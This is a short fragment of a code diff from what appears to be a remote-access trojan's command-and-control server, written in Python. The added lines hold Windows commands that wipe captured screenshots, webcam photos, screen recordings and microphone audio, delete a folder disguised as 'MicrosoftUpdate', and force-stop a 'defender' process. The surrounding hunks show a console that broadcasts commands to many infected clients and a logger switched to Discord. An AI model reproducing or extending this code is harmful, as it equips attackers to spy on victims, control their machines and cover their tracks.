+                            'del /f /q "%USERPROFILE%\\screenshot.png" 2>nul & del /f /q "%USERPROFILE%\\webcam.jpg" 2>nul & del /f /q "%USERPROFILE%\\screen.mp4" 2>nul & del /f /q "%USERPROFILE%\\mic.wav" 2>nul & rd /s /q "%APPDATA%\\MicrosoftUpdate" 2>nul',
+                            'powershell -Command "Start-Sleep 2; Stop-Process -Name defender -Force -ErrorAction SilentlyContinue; Stop-Process -Name PhantomLink -Force -ErrorAction SilentlyContinue"'
+                        ]
 
                     }
 
@@ -2363,7 +2582,7 @@ def main():
 
                         print("-" * 70)
 
-                tel_logger(f"Broadcast command '{cmd}' to {len(clients)} clients")
+                discord_logger(f"Broadcast command '{cmd}' to {len(clients)} clients")
 
             else:
                 print("[!] Unknown command. Use 'list', 'connect', 'broadcast', or 'quit'")
@@ -2375,7 +2594,7 @@ def main():
         print("[+] Cleaning up...")
         try:
             s.close()
-        except:
+        except Exception:
             pass
 
 
